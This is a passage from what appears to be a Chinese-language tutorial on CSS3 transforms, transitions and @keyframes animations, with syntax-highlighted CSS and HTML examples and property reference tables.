class="hljs-attribute">transform</span>: <span class="hljs-built_in">rotate</span>(<span class="hljs-number">30deg</span>); <span class="hljs-comment">/* IE 9 */</span><br>-webkit-<span class="hljs-attribute">transform</span>: <span class="hljs-built_in">rotate</span>(<span class="hljs-number">30deg</span>); <span class="hljs-comment">/* Safari and Chrome */</span><br>&#125;  <br></code></pre></div></td></tr></table></figure><h3 id="1-3-大小（scale-）"><a href="#1-3-大小（scale-）" class="headerlink" title="1.3 大小（scale()）"></a>1.3 大小（scale()）</h3><p>scale()方法，该元素增加或减少的大小，取决于宽度（X轴）和高度（Y轴）的参数。</p><p>使用实例：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">div</span>&#123;<br><span class="hljs-attribute">transform</span>: <span class="hljs-built_in">scale</span>(<span class="hljs-number">2</span>,<span class="hljs-number">4</span>);<span class="hljs-comment">/*宽度为原来的大小的2倍，和其原始大小4倍的高度。*/</span><br>-ms-<span class="hljs-attribute">transform</span>: <span class="hljs-built_in">scale</span>(<span class="hljs-number">2</span>,<span class="hljs-number">4</span>); <span class="hljs-comment">/* IE 9 */</span><br>-webkit-<span class="hljs-attribute">transform</span>: <span class="hljs-built_in">scale</span>(<span class="hljs-number">2</span>,<span class="hljs-number">4</span>); <span class="hljs-comment">/* Safari and Chrome */</span><br>&#125;  <br></code></pre></div></td></tr></table></figure><h3 id="1-4-倾斜（skew-）"><a href="#1-4-倾斜（skew-）" class="headerlink" title="1.4 倾斜（skew()）"></a>1.4 倾斜（skew()）</h3><p>包含两个参数值，分别表示X轴和Y轴倾斜的角度，如果第二个参数为空，则默认为0，参数为负表示向相反方向倾斜。</p><blockquote><ul><li>skewX( );表示只在X轴(水平方向)倾斜。</li><li>skewY( );表示只在Y轴(垂直方向)倾斜。</li></ul></blockquote><p>使用实例：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">div</span>&#123;<br><span class="hljs-attribute">transform</span>: <span class="hljs-built_in">skew</span>(<span class="hljs-number">30deg</span>,<span class="hljs-number">20deg</span>);<span class="hljs-comment">/*元素在X轴和Y轴上倾斜20度和30度。*/</span><br>-ms-<span class="hljs-attribute">transform</span>: <span class="hljs-built_in">skew</span>(<span class="hljs-number">30deg</span>,<span class="hljs-number">20deg</span>); <span class="hljs-comment">/* IE 9 */</span><br>-webkit-<span class="hljs-attribute">transform</span>: <span class="hljs-built_in">skew</span>(<span class="hljs-number">30deg</span>,<span class="hljs-number">20deg</span>); <span class="hljs-comment">/* Safari and Chrome */</span><br>&#125;  <br></code></pre></div></td></tr></table></figure><h3 id="1-5-matrix-方法"><a href="#1-5-matrix-方法" class="headerlink" title="1.5 matrix() 方法"></a>1.5 matrix() 方法</h3><p>matrix()方法和2D变换方法合并成一个。matrix 方法有六个参数，包含旋转，缩放，移动（平移）和倾斜功能。</p><p>使用实例：利用matrix()方法旋转div元素30°</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">div</span>&#123;<br><span class="hljs-attribute">transform</span>:<span class="hljs-built_in">matrix</span>(<span class="hljs-number">0.866</span>,<span class="hljs-number">0.5</span>,-<span class="hljs-number">0.5</span>,<span class="hljs-number">0.866</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);<br>-ms-<span class="hljs-attribute">transform</span>:<span class="hljs-built_in">matrix</span>(<span class="hljs-number">0.866</span>,<span class="hljs-number">0.5</span>,-<span class="hljs-number">0.5</span>,<span class="hljs-number">0.866</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>); <span class="hljs-comment">/* IE 9 */</span><br>-webkit-<span class="hljs-attribute">transform</span>:<span class="hljs-built_in">matrix</span>(<span class="hljs-number">0.866</span>,<span class="hljs-number">0.5</span>,-<span class="hljs-number">0.5</span>,<span class="hljs-number">0.866</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>); <span class="hljs-comment">/* Safari and Chrome */</span><br>&#125;  <br></code></pre></div></td></tr></table></figure><h3 id="1-6-transform-属性"><a href="#1-6-transform-属性" class="headerlink" title="1.6 transform 属性"></a>1.6 transform 属性</h3><p>Transform属性应用于元素的2D或3D转换。这个属性允许你将元素旋转，缩放，移动，倾斜等。<br>语法：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-attribute">transform</span>: none|transform-functions;<br></code></pre></div></td></tr></table></figure><table><thead><tr><th align="center">值</th><th align="center">描述</th><th></th></tr></thead><tbody><tr><td align="center">none</td><td align="center">定义不进行转换。</td><td></td></tr><tr><td align="center">matrix(<em>n</em>,<em>n</em>,<em>n</em>,<em>n</em>,<em>n</em>,<em>n</em>)</td><td align="center">定义 2D 转换，使用六个值的矩阵。</td><td></td></tr><tr><td align="center">matrix3d(<em>n</em>,<em>n</em>,<em>n</em>,<em>n</em>,<em>n</em>,<em>n</em>,<em>n</em>,<em>n</em>,<em>n</em>,<em>n</em>,<em>n</em>,<em>n</em>,<em>n</em>,<em>n</em>,<em>n</em>,<em>n</em>)</td><td align="center">定义 3D 转换，使用 16 个值的 4x4 矩阵。</td><td></td></tr><tr><td align="center">translate(<em>x</em>,<em>y</em>)</td><td align="center">定义 2D 转换。</td><td></td></tr><tr><td align="center">translate3d(<em>x</em>,<em>y</em>,<em>z</em>)</td><td align="center">定义 3D 转换。</td><td></td></tr><tr><td align="center">translateX(<em>x</em>)</td><td align="center">定义转换，只是用 X 轴的值。</td><td></td></tr><tr><td align="center">translateY(<em>y</em>)</td><td align="center">定义转换，只是用 Y 轴的值。</td><td></td></tr><tr><td align="center">translateZ(<em>z</em>)</td><td align="center">定义 3D 转换，只是用 Z 轴的值。</td><td></td></tr><tr><td align="center">scale(<em>x</em>[,<em>y</em>]?)</td><td align="center">定义 2D 缩放转换。</td><td></td></tr><tr><td align="center">scale3d(<em>x</em>,<em>y</em>,<em>z</em>)</td><td align="center">定义 3D 缩放转换。</td><td></td></tr><tr><td align="center">scaleX(<em>x</em>)</td><td align="center">通过设置 X 轴的值来定义缩放转换。</td><td></td></tr><tr><td align="center">scaleY(<em>y</em>)</td><td align="center">通过设置 Y 轴的值来定义缩放转换。</td><td></td></tr><tr><td align="center">scaleZ(<em>z</em>)</td><td align="center">通过设置 Z 轴的值来定义 3D 缩放转换。</td><td></td></tr><tr><td align="center">rotate(<em>angle</em>)</td><td align="center">定义 2D 旋转，在参数中规定角度。</td><td></td></tr><tr><td align="center">rotate3d(<em>x</em>,<em>y</em>,<em>z</em>,<em>angle</em>)</td><td align="center">定义 3D 旋转。</td><td></td></tr><tr><td align="center">rotateX(<em>angle</em>)</td><td align="center">定义沿着 X 轴的 3D 旋转。</td><td></td></tr><tr><td align="center">rotateY(<em>angle</em>)</td><td align="center">定义沿着 Y 轴的 3D 旋转。</td><td></td></tr><tr><td align="center">rotateZ(<em>angle</em>)</td><td align="center">定义沿着 Z 轴的 3D 旋转。</td><td></td></tr><tr><td align="center">skew(<em>x-angle</em>,<em>y-angle</em>)</td><td align="center">定义沿着 X 和 Y 轴的 2D 倾斜转换。</td><td></td></tr><tr><td align="center">skewX(<em>angle</em>)</td><td align="center">定义沿着 X 轴的 2D 倾斜转换。</td><td></td></tr><tr><td align="center">skewY(<em>angle</em>)</td><td align="center">定义沿着 Y 轴的 2D 倾斜转换。</td><td></td></tr><tr><td align="center">perspective(<em>n</em>)</td><td align="center">为 3D 转换元素定义透视视图。</td><td></td></tr></tbody></table><p>使用实例：旋转 div 元素</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">div</span>&#123;<br><span class="hljs-attribute">transform</span>:<span class="hljs-built_in">rotate</span>(<span class="hljs-number">7deg</span>);<br>-ms-<span class="hljs-attribute">transform</span>:<span class="hljs-built_in">rotate</span>(<span class="hljs-number">7deg</span>); <span class="hljs-comment">/* IE 9 */</span><br>-webkit-<span class="hljs-attribute">transform</span>:<span class="hljs-built_in">rotate</span>(<span class="hljs-number">7deg</span>); <span class="hljs-comment">/* Safari and Chrome */</span><br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="1-7-transform-origin-属性"><a href="#1-7-transform-origin-属性" class="headerlink" title="1.7 transform-origin 属性"></a>1.7 transform-origin 属性</h3><p>transform-Origin属性允许您更改转换元素的位置。2D转换元素可以改变元素的X和Y轴。 3D转换元素，还可以更改元素的Z轴。<br>语法：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-attribute">transform-origin</span>: x-axis y-axis z-axis;<br></code></pre></div></td></tr></table></figure><table><thead><tr><th align="center">值</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">x-axis</td><td align="center">定义视图被置于 X 轴的何处。可能的值：left、center、right、<em>length</em>、*%*</td></tr><tr><td align="center">y-axis</td><td align="center">定义视图被置于 Y 轴的何处。可能的值：top、center、bottom、<em>length</em>、*%*</td></tr><tr><td align="center">z-axis</td><td align="center">定义视图被置于 Z 轴的何处。可能的值：<em>length</em></td></tr></tbody></table><p>使用实例：设置旋转元素的基点位置</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">div</span>&#123;<br><span class="hljs-attribute">transform</span>: <span class="hljs-built_in">rotate</span>(<span class="hljs-number">45deg</span>);<br><span class="hljs-attribute">transform-origin</span>:<span class="hljs-number">20%</span> <span class="hljs-number">40%</span>;<br>-ms-<span class="hljs-attribute">transform</span>: <span class="hljs-built_in">rotate</span>(<span class="hljs-number">45deg</span>); <span class="hljs-comment">/* IE 9 */</span><br>-ms-<span class="hljs-attribute">transform-origin</span>:<span class="hljs-number">20%</span> <span class="hljs-number">40%</span>; <span class="hljs-comment">/* IE 9 */</span><br>-webkit-<span class="hljs-attribute">transform</span>: <span class="hljs-built_in">rotate</span>(<span class="hljs-number">45deg</span>); <span class="hljs-comment">/* Safari and Chrome */</span><br>-webkit-<span class="hljs-attribute">transform-origin</span>:<span class="hljs-number">20%</span> <span class="hljs-number">40%</span>; <span class="hljs-comment">/* Safari and Chrome */</span><br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="2-3D转换"><a href="#2-3D转换" class="headerlink" title="2.3D转换"></a>2.3D转换</h2><p>CSS3 允许您使用 3D 转换来对元素进行格式化。</p><table><thead><tr><th align="center">函数</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">matrix3d(<em>n**</em>,<em><strong>n</strong></em>,** <em>n**</em>,<em><strong>n</strong></em>,<em><strong>n</strong></em>,**<em>n</em> **,<em><strong>n</strong></em>,<em><strong>n</strong></em>,<em><strong>n* <strong>,<em><strong>n</strong></em>,<em><strong>n</strong></em>,<em><strong>n</strong></em>,</strong> *n</strong></em>,<em><strong>n</strong></em>,<em><strong>n</strong></em>,**<em>n</em> )</td><td align="center">定义 3D 转换<strong>，</strong>使用 16 个值的 4x4 矩阵。</td></tr><tr><td align="center">translate3d(<em>x**</em>,<em><strong>y</strong></em>,**<em>z</em>)</td><td align="center">定义 3D 转化。</td></tr><tr><td align="center">translateX(<em>x</em>)</td><td align="center">定义 3D 转化<strong>，</strong>仅使用用于 X 轴的值。</td></tr><tr><td align="center">translateY(<em>y</em>)</td><td align="center">定义 3D 转化<strong>，</strong>仅使用用于 Y 轴的值。</td></tr><tr><td align="center">translateZ(<em>z</em>)</td><td align="center">定义 3D 转化<strong>，</strong>仅使用用于 Z 轴的值。</td></tr><tr><td align="center">scale3d(<em>x**</em>,<em><strong>y</strong></em>,**<em>z</em>)</td><td align="center">定义 3D 缩放转换。</td></tr><tr><td align="center">scaleX(<em>x</em>)</td><td align="center">定义 3D 缩放转换<strong>，</strong>通过给定一个 X 轴的值。</td></tr><tr><td align="center">scaleY(<em>y</em>)</td><td align="center">定义 3D 缩放转换<strong>，</strong>通过给定一个 Y 轴的值。</td></tr><tr><td align="center">scaleZ(<em>z</em>)</td><td align="center">定义 3D 缩放转换<strong>，</strong>通过给定一个 Z 轴的值。</td></tr><tr><td align="center">rotate3d(<em>x**</em>,<em><strong>y</strong></em>,<em><strong>z</strong></em>,**<em>angle</em>)</td><td align="center">定义 3D 旋转。</td></tr><tr><td align="center">rotateX(<em>angle</em>)</td><td align="center">定义沿 X 轴的 3D 旋转。</td></tr><tr><td align="center">rotateY(<em>angle</em>)</td><td align="center">定义沿 Y 轴的 3D 旋转。</td></tr><tr><td align="center">rotateZ(<em>angle</em>)</td><td align="center">定义沿 Z 轴的 3D 旋转。</td></tr><tr><td align="center">perspective(<em>n</em>)</td><td align="center">定义 3D 转换元素的透视视图。</td></tr></tbody></table><p>CSS3所有的转换属性：</p><table><thead><tr><th align="center">属性</th><th align="center">描述</th><th align="center"><strong>CSS</strong></th></tr></thead><tbody><tr><td align="center">transform</td><td align="center">向元素应用 2D 或 3D 转换。</td><td align="center">3</td></tr><tr><td align="center">transform-origin</td><td align="center">允许你改变被转换元素的位置。</td><td align="center">3</td></tr><tr><td align="center">transform-style</td><td align="center">规定被嵌套元素如何在 3D 空间中显示。</td><td align="center">3</td></tr><tr><td align="center">perspective</td><td align="center">规定 3D 元素的透视效果。</td><td align="center">3</td></tr><tr><td align="center">perspective-origin</td><td align="center">规定 3D 元素的底部位置。</td><td align="center">3</td></tr><tr><td align="center">backface-visibility</td><td align="center">定义元素在不面对屏幕时是否可见。</td><td align="center">3</td></tr></tbody></table><h3 id="2-1-绕X轴旋转（rotateX-）"><a href="#2-1-绕X轴旋转（rotateX-）" class="headerlink" title="2.1 绕X轴旋转（rotateX()）"></a>2.1 绕X轴旋转（rotateX()）</h3><p>rotateX()方法，围绕X轴旋转，以给定的度数。</p><p>使用实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>W3C(w3cschool.cn)<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span> <br><span class="css"><span class="hljs-selector-tag">div</span>&#123;</span><br><span class="css">    <span class="hljs-attribute">width</span>:<span class="hljs-number">100px</span>;</span><br><span class="css">    <span class="hljs-attribute">height</span>:<span class="hljs-number">75px</span>;</span><br><span class="css">    <span class="hljs-attribute">background-color</span>:red;</span><br><span class="css">    <span class="hljs-attribute">border</span>:<span class="hljs-number">1px</span> solid black;</span><br>&#125;<br><span class="css"><span class="hljs-selector-tag">div</span><span class="hljs-selector-id">#div2</span>&#123;</span><br><span class="css">    <span class="hljs-attribute">transform</span>:<span class="hljs-built_in">rotateX</span>(<span class="hljs-number">120deg</span>);</span><br><span class="css">    -webkit-<span class="hljs-attribute">transform</span>:<span class="hljs-built_in">rotateX</span>(<span class="hljs-number">120deg</span>); <span class="hljs-comment">/* Safari and Chrome */</span></span><br>&#125;<br><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>Hello. This is a DIV element.<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;div2&quot;</span>&gt;</span>Hello. This is a DIV element.<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="2-2-绕Y轴旋转（rotateY-）"><a href="#2-2-绕Y轴旋转（rotateY-）" class="headerlink" title="2.2 绕Y轴旋转（rotateY()）"></a>2.2 绕Y轴旋转（rotateY()）</h3><p>rotateY()方法，围绕Y轴旋转，以给定的度数。</p><p>使用实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>W3C(w3cschool.cn)<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span> <br><span class="css"><span class="hljs-selector-tag">div</span>&#123;</span><br><span class="css"><span class="hljs-attribute">width</span>:<span class="hljs-number">100px</span>;</span><br><span class="css"><span class="hljs-attribute">height</span>:<span class="hljs-number">75px</span>;</span><br><span class="css"><span class="hljs-attribute">background-color</span>:red;</span><br><span class="css"><span class="hljs-attribute">border</span>:<span class="hljs-number">1px</span> solid black;</span><br>&#125;<br><span class="css"><span class="hljs-selector-tag">div</span><span class="hljs-selector-id">#div2</span>&#123;</span><br><span class="css"><span class="hljs-attribute">transform</span>:<span class="hljs-built_in">rotateY</span>(<span class="hljs-number">130deg</span>);</span><br><span class="css">-webkit-<span class="hljs-attribute">transform</span>:<span class="hljs-built_in">rotateY</span>(<span class="hljs-number">130deg</span>); <span class="hljs-comment">/* Safari and Chrome */</span></span><br>&#125;<br><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>Hello. This is a DIV element.<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;div2&quot;</span>&gt;</span>Hello. This is a DIV element.<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h2 id="3-过渡"><a href="#3-过渡" class="headerlink" title="3.过渡"></a>3.过渡</h2><p>CSS3中，为了添加某种效果可以从一种样式转变到另一个的时候，无需使用Flash动画或JavaScript。CSS3 过渡是元素从一种样式逐渐改变为另一种的效果。</p><p>所有的过渡属性：</p><table><thead><tr><th align="center">属性</th><th align="center">描述</th><th align="center">CSS</th></tr></thead><tbody><tr><td align="center">transition</td><td align="center">简写属性，用于在一个属性中设置四个过渡属性。</td><td align="center">3</td></tr><tr><td align="center">transition-property</td><td align="center">规定应用过渡的 CSS 属性的名称。</td><td align="center">3</td></tr><tr><td align="center">transition-duration</td><td align="center">定义过渡效果花费的时间。默认是 0。</td><td align="center">3</td></tr><tr><td align="center">transition-timing-function</td><td align="center">规定过渡效果的时间曲线。默认是 “ease”。</td><td align="center">3</td></tr><tr><td align="center">transition-delay</td><td align="center">规定过渡效果何时开始。默认是 0。</td><td align="center">3</td></tr></tbody></table><p>要实现这一点，必须规定两项内容：</p><blockquote><ol><li>指定要添加效果的CSS属性</li><li>指定效果的持续时间。</li></ol></blockquote><p>使用实例1：应用于宽度属性的过渡效果，时长为 2 秒</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">div</span>&#123;<br><span class="hljs-attribute">transition</span>: width <span class="hljs-number">2s</span>;<br>-webkit-<span class="hljs-attribute">transition</span>: width <span class="hljs-number">2s</span>; <span class="hljs-comment">/* Safari */</span><br>&#125;  <br></code></pre></div></td></tr></table></figure><p>如果未指定的期限，transition将没有任何效果，因为默认值是0。</p><p>使用实例2：当鼠标指针悬浮(:hover)于 div 元素上时</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">div</span><span class="hljs-selector-pseudo">:hover</span>&#123;<br><span class="hljs-attribute">width</span>:<span class="hljs-number">300px</span>;<br>&#125;  <br></code></pre></div></td></tr></table></figure><h3 id="3-1-多项改变"><a href="#3-1-多项改变" class="headerlink" title="3.1 多项改变"></a>3.1 多项改变</h3><p>要添加多个样式的变换效果，添加的属性由逗号分隔。</p><p>使用实例：添加宽度，高度和转换效果</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">div</span>&#123;<br><span class="hljs-attribute">transition</span>: width <span class="hljs-number">2s</span>, height <span class="hljs-number">2s</span>, transform <span class="hljs-number">2s</span>;<br>-webkit-<span class="hljs-attribute">transition</span>: width <span class="hljs-number">2s</span>, height <span class="hljs-number">2s</span>, -webkit-transform <span class="hljs-number">2s</span>;<br>&#125;  <br></code></pre></div></td></tr></table></figure><h3 id="3-2-设置所有属性"><a href="#3-2-设置所有属性" class="headerlink" title="3.2 设置所有属性"></a>3.2 设置所有属性</h3><h4 id="3-2-1-实例1"><a href="#3-2-1-实例1" class="headerlink" title="3.2.1 实例1"></a>3.2.1 实例1</h4><p>在一个例子中使用所有过渡属性。</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">div</span>&#123;<br><span class="hljs-attribute">transition-property</span>: width;<br><span class="hljs-attribute">transition-duration</span>: <span class="hljs-number">1s</span>;<br><span class="hljs-attribute">transition-timing-function</span>: linear;<br><span class="hljs-attribute">transition-delay</span>: <span class="hljs-number">2s</span>;<br><span class="hljs-comment">/* Safari */</span><br>-webkit-<span class="hljs-attribute">transition-property</span>:width;<br>-webkit-<span class="hljs-attribute">transition-duration</span>:<span class="hljs-number">1s</span>;<br>-webkit-<span class="hljs-attribute">transition-timing-function</span>:linear;<br>-webkit-<span class="hljs-attribute">transition-delay</span>:<span class="hljs-number">2s</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="3-2-2-实例2"><a href="#3-2-2-实例2" class="headerlink" title="3.2.2 实例2"></a>3.2.2 实例2</h4><p>与上面的例子相同的过渡效果，但是简写的 transition 属性。</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">div</span>&#123;<br><span class="hljs-attribute">transition</span>: width <span class="hljs-number">1s</span> linear <span class="hljs-number">2s</span>;<br><span class="hljs-comment">/* Safari */</span><br>-webkit-<span class="hljs-attribute">transition</span>:width <span class="hljs-number">1s</span> linear <span class="hljs-number">2s</span>;<br>&#125;  <br></code></pre></div></td></tr></table></figure><h2 id="4-动画"><a href="#4-动画" class="headerlink" title="4.动画"></a>4.动画</h2><p>CSS3，我们可以创建动画，它可以取代许多网页动画图像，Flash动画，和JAVAScripts。动画是使元素从一种样式逐渐变化为另一种样式的效果。您可以改变任意多的样式任意多的次数。</p><p>请用百分比来规定变化发生的时间，或用关键词 “from” 和 “to”，等同于 0% 和 100%。0% 是动画的开始，100% 是动画的完成。<br>为了得到最佳的浏览器支持，您应该始终定义 0% 和 100% 选择器。</p><p>@keyframes 规则和所有动画属性：</p><table><thead><tr><th align="center">属性</th><th align="center">描述</th><th align="center">CSS</th></tr></thead><tbody><tr><td align="center">@keyframes</td><td align="center">规定动画。</td><td align="center">3</td></tr><tr><td align="center">animation</td><td align="center">所有动画属性的简写属性，除了 animation-play-state 属性。</td><td align="center">3</td></tr><tr><td align="center">animation-name</td><td align="center">规定 @keyframes 动画的名称。</td><td align="center">3</td></tr><tr><td align="center">animation-duration</td><td align="center">规定动画完成一个周期所花费的秒或毫秒。默认是 0。</td><td align="center">3</td></tr><tr><td align="center">animation-timing-function</td><td align="center">规定动画的速度曲线。默认是 “ease”。</td><td align="center">3</td></tr><tr><td align="center">animation-delay</td><td align="center">规定动画何时开始。默认是 0。</td><td align="center">3</td></tr><tr><td align="center">animation-iteration-count</td><td align="center">规定动画被播放的次数。默认是 1。</td><td align="center">3</td></tr><tr><td align="center">animation-direction</td><td align="center">规定动画是否在下一周期逆向地播放。默认是 “normal”。</td><td align="center">3</td></tr><tr><td align="center">animation-play-state</td><td align="center">规定动画是否正在运行或暂停。默认是 “running”。</td><td align="center">3</td></tr></tbody></table><h3 id="4-1-keyframes-规则"><a href="#4-1-keyframes-规则" class="headerlink" title="4.1 @keyframes 规则"></a>4.1 @keyframes 规则</h3><p>@keyframes规则是创建动画。 @keyframes规则内指定一个CSS样式和动画将逐步从目前的样式更改为新的样式。</p><p>实例：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-keyword">@keyframes</span> myfirst&#123;<br><span class="hljs-selector-tag">from</span> &#123;<span class="hljs-attribute">background</span>: red;&#125;<br><span class="hljs-selector-tag">to</span> &#123;<span class="hljs-attribute">background</span>: yellow;&#125;<br>&#125;<br><br><span class="hljs-keyword">@-webkit-keyframes</span> myfirst /* Safari <span class="hljs-keyword">and</span> Chrome */<br>&#123;<br><span class="hljs-selector-tag">from</span> &#123;<span class="hljs-attribute">background</span>: red;&#125;<br><span class="hljs-selector-tag">to</span> &#123;<span class="hljs-attribute">background</span>: 